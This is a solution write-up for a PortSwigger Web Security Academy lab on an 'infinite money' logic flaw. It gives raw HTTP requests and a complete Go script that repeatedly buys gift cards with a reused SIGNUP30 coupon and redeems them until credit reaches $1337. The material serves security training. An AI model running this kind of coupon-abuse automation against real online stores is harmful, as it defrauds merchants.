# [Lab 10: Infinite money logic flaw](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money)

---

## Description

This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: `wiener:peter`

---

## Solution

### Enumeration

#### Home Page: `/`

Home page with card links to products. Links to `/my-account` and `/cart`.

![](images/Pasted%20image%2020210901204655.png)

Newsletter sign up form with input `email`. `POST`s to `/sign-up`. Successful submission yields a coupon code `SIGNUP30`.

![](images/Pasted%20image%2020210901204622.png)

#### Login Form: `/login`

```http
POST /login HTTP/1.1
Host: ac1d1f7a1ffa05de8038c2c7001700a1.web-security-academy.net
Cookie: session=DNntH74KPKxNyJCPPxsWsZX6jNRyvRpx
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://ac1d1f7a1ffa05de8038c2c7001700a1.web-security-academy.net
Dnt: 1
Referer: https://ac1d1f7a1ffa05de8038c2c7001700a1.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=VEsxHkTfqziJ24Xx6PpXh3P1xsIHTGHg&username=wiener&password=peter
```

#### My Account Page: `/my-account`

Accessible after a successful login. The page designates how much store credit the account has and contains links to `/home`, `/my-account`, `/cart`, and `/logout`. The page has two major features: one to update the account's email address and another to redeem a gift card code.

![](images/Pasted%20image%2020210901205131.png)

##### Redeeming an **Invalid** Gift Card Code

```http
POST /gift-card HTTP/1.1
Host: ac1d1f7a1ffa05de8038c2c7001700a1.web-security-academy.net
Cookie: session=pkCVyB7HiVKOa4QXeAZol45pfonMwvTv
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Origin: https://ac1d1f7a1ffa05de8038c2c7001700a1.web-security-academy.net
Dnt: 1
Referer: https://ac1d1f7a1ffa05de8038c2c7001700a1.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=SHqIUyFizS0gUXAX9B3g7EtSu3AkmKee&gift-card=blah
```

The response is a 400 with the string `Invalid gift card`.

#### Purchasing Workflow - Buying a Gift Card with a Coupon

Navigate to the gift card product page and add one to the cart.

```http
POST /cart HTTP/1.1
Host: ac1d1f7a1ffa05de8038c2c7001700a1.web-security-academy.net
Cookie: session=pkCVyB7HiVKOa4QXeAZol45pfonMwvTv
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: https://ac1d1f7a1ffa05de8038c2c7001700a1.web-security-academy.net
Dnt: 1
Referer: https://ac1d1f7a1ffa05de8038c2c7001700a1.web-security-academy.net/product?productId=2
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

productId=2&redir=PRODUCT&quantity=1
```

Navigate to the cart and enter the `SIGNUP30` coupon code from joining the newsletter.

```http
POST /cart/coupon HTTP/1.1
Host: ac1d1f7a1ffa05de8038c2c7001700a1.web-security-academy.net
Cookie: session=pkCVyB7HiVKOa4QXeAZol45pfonMwvTv
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: https://ac1d1f7a1ffa05de8038c2c7001700a1.web-security-academy.net
Dnt: 1
Referer: https://ac1d1f7a1ffa05de8038c2c7001700a1.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=SHqIUyFizS0gUXAX9B3g7EtSu3AkmKee&coupon=SIGNUP30
```

The coupon code takes 30% off the total price, bringing it down to $7.

![](images/Pasted%20image%2020210901205926.png)

Place the order.

```http
POST /cart/checkout HTTP/1.1
Host: ac1d1f7a1ffa05de8038c2c7001700a1.web-security-academy.net
Cookie: session=pkCVyB7HiVKOa4QXeAZol45pfonMwvTv
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://ac1d1f7a1ffa05de8038c2c7001700a1.web-security-academy.net
Dnt: 1
Referer: https://ac1d1f7a1ffa05de8038c2c7001700a1.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=SHqIUyFizS0gUXAX9B3g7EtSu3AkmKee
```

The response is a 303 redirect to `/cart/order-confirmation?order-confirmed=true`. The body of the response after following the redirect contains the gift card code.

![](images/Pasted%20image%2020210901210407.png)

The account's store credit after the purchase is $93. If the $10 gift card is redeemed, the total will be $103, meaning the coupon code made it possible to gain money. How does the application ensure each account only uses this coupon code once? Does it?

After walking back through the purchasing workflow, it appears that the application does not properly ensure that each account only uses the coupon code once. It is possible to use the coupon code again and again to purchase a $10 gift card at a discounted price and then redeem the gift card for infinite money.

### Exploitation

Add 10 $10 gift cards to the cart and apply the `SIGNUP30` discount code for a total price of $70. Place the order and redeem the gift cards to gain $100 back, for a total store credit of $130. Repeat this process until it is possible to purchase a "l33t leather jacket." The following Go program automates this process:

```go
package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/anaskhan96/soup"
)

const URL = "https://aced1f851fd483398069055d00de007e.web-security-academy.net"

func GetLoginPageTokenAndCSRF() (*http.Cookie, string) {

	// Retrieve the login page
	resp, err := http.Get(fmt.Sprintf("%s/login", URL))
	if err != nil {
		log.Fatalln(err)
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}
	sb := string(body)

	// Extract the CSRF token from the login page
	html := soup.HTMLParse(sb)
	if html.Error != nil {
		log.Fatalln(html.Error)
	}
	csrfElement := html.Find("input", "name", "csrf")
	csrfToken := csrfElement.Attrs()["value"]

	// Grab session cookie
	cookies := resp.Cookies()
	sessionToken := cookies[0]

	return sessionToken, csrfToken
}

func Login(sessionToken *http.Cookie, csrfToken string) *http.Cookie {

	// Log in to the web application and return the authenticated session token
	client := http.Client{
		Timeout: 60 * time.Second,
		Transport: &http.Transport{
			TLSHandshakeTimeout: 20 * time.Second,
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	creds := url.Values{"csrf": {csrfToken}, "username": {"wiener"}, "password": {"peter"}}
	req, err := http.NewRequest("POST", fmt.Sprintf("%s/login", URL), strings.NewReader(creds.Encode()))
	if err != nil {
		log.Fatalln(err)
	}
	req.AddCookie(sessionToken)
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}
	cookie := resp.Cookies()[0]
	return &http.Cookie{Name: cookie.Name, Value: cookie.Value}
}

func AddGiftCardsToCart(sessionToken *http.Cookie, quantity int) {

	client := http.Client{
		Timeout: 60 * time.Second,
		Transport: &http.Transport{
			TLSHandshakeTimeout: 20 * time.Second,
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		},
	}
	body := url.Values{"productId": {"2"}, "redir": {"PRODUCT"}, "quantity": {strconv.Itoa(quantity)}}
	req, err := http.NewRequest("POST", fmt.Sprintf("%s/cart", URL), strings.NewReader(body.Encode()))
	if err != nil {
		log.Fatalln(err)
	}
	req.AddCookie(sessionToken)
	_, err = client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}
}

func GetCartCSRFToken(sessionToken *http.Cookie) string {

	// Retrieve the cart page
	client := http.Client{
		Timeout: 60 * time.Second,
		Transport: &http.Transport{
			TLSHandshakeTimeout: 20 * time.Second,
		},
	}
	req, err := http.NewRequest("GET", fmt.Sprintf("%s/cart", URL), nil)
	req.AddCookie(sessionToken)
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}
	responseBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}
	sb := string(responseBody)

	// Extract the CSRF token from the cart page
	html := soup.HTMLParse(sb)
	if html.Error != nil {
		log.Fatalln(html.Error)
	}
	csrfElement := html.Find("input", "name", "csrf")
	return csrfElement.Attrs()["value"]
}

func ApplyDiscountCode(sessionToken *http.Cookie, cartCSRFToken string) {

	// Apply discount code
	client := http.Client{
		Timeout: 60 * time.Second,
		Transport: &http.Transport{
			TLSHandshakeTimeout: 20 * time.Second,
		},
	}
	body := url.Values{"csrf": {cartCSRFToken}, "coupon": {"SIGNUP30"}}
	req, err := http.NewRequest("POST", fmt.Sprintf("%s/cart/coupon", URL), strings.NewReader(body.Encode()))
	req.AddCookie(sessionToken)
	_, err = client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}
}

func PlaceOrder(sessionToken *http.Cookie, cartCSRFToken string) string {

	client := http.Client{
		Timeout: 60 * time.Second,
		Transport: &http.Transport{
			TLSHandshakeTimeout: 20 * time.Second,
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		},
	}

	body := url.Values{"csrf": {cartCSRFToken}}
	req, err := http.NewRequest("POST", fmt.Sprintf("%s/cart/checkout", URL), strings.NewReader(body.Encode()))
	req.AddCookie(sessionToken)
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}
	responseBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}
	return string(responseBody)
}

func ScrapeGiftCardCodes(orderConfirmationHtml string) []string {
	var giftCardCodes []string
	html := soup.HTMLParse(orderConfirmationHtml)
	if html.Error != nil {
		log.Fatalln(html.Error)
	}
	trs := html.Find("table", "class", "is-table-numbers").Find("tbody").FindAll("tr")
	for _, tr := range trs {
		td := tr.Find("td")
		if td.Error == nil {
			giftCardCodes = append(giftCardCodes, td.Text())
		}
	}
	return giftCardCodes
}

func ApplyGiftCardCodes(sessionToken *http.Cookie, giftCardCodes []string) {

	client := http.Client{
		Timeout: 60 * time.Second,
		Transport: &http.Transport{
			TLSHandshakeTimeout: 20 * time.Second,
		},
	}

	// Grab the /my-account CSRF token
	req, err := http.NewRequest("GET", fmt.Sprintf("%s/my-account", URL), nil)
	if err != nil {
		log.Fatalln(err)
	}
	req.AddCookie(sessionToken)
	resp, err := client.Do(req)
	responseBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}
	sb := string(responseBody)
	html := soup.HTMLParse(sb)
	csrfElement := html.Find("input", "name", "csrf")
	if csrfElement.Error != nil {
		log.Fatalln(csrfElement.Error)
	}
	csrfToken := csrfElement.Attrs()["value"]

	// Apply the coupon codes
	for _, code := range giftCardCodes {
		body := url.Values{"csrf": {csrfToken}, "gift-card": {code}}
		req, err := http.NewRequest("POST", fmt.Sprintf("%s/gift-card", URL), strings.NewReader(body.Encode()))
		if err != nil {
			log.Fatalln(err)
		}
		req.AddCookie(sessionToken)
		_, err = client.Do(req)
		if err != nil {
			log.Fatalln(err)
		}
	}
}

func GetStoreCredit(sessionToken *http.Cookie) float64 {

	client := http.Client{
		Timeout: 60 * time.Second,
		Transport: &http.Transport{
			TLSHandshakeTimeout: 20 * time.Second,
		},
	}
	req, err := http.NewRequest("GET", fmt.Sprintf("%s/cart", URL), nil)
	if err != nil {
		log.Fatalln(err)
	}
	req.AddCookie(sessionToken)
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}
	responseBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}
	sb := string(responseBody)
	html := soup.HTMLParse(sb)
	strong := html.Find("strong")
	if strong.Error != nil {
		log.Fatalln(strong.Error)
	}
	re := regexp.MustCompile(`\$(\d+\.\d{2})`)
	matches := re.FindStringSubmatch(strong.Text())
	if len(matches) != 2 {
		log.Fatalln("[!] Error parsing store credit")
	}
	storeCredit, err := strconv.ParseFloat(matches[1], 64)
	if err != nil {
		log.Fatalln(err)
	}
	return storeCredit
}

func main() {
	sessionToken, csrfToken := GetLoginPageTokenAndCSRF()
	authenticatedSessionToken := Login(sessionToken, csrfToken)

	for {
		AddGiftCardsToCart(authenticatedSessionToken, 10)
		cartCSRFToken := GetCartCSRFToken(authenticatedSessionToken)
		ApplyDiscountCode(authenticatedSessionToken, cartCSRFToken)
		orderConfirmationHtml := PlaceOrder(authenticatedSessionToken, cartCSRFToken)
		giftCardCodes := ScrapeGiftCardCodes(orderConfirmationHtml)
		ApplyGiftCardCodes(authenticatedSessionToken, giftCardCodes)
		storeCredit := GetStoreCredit(authenticatedSessionToken)
		fmt.Printf("[*] Current store credit: %f\n", storeCredit)

		if storeCredit >= 1337 {
			fmt.Println("[*] Store credit has exceeded $1337.00! Go buy that jacket!")
			break
		}
	}
}
```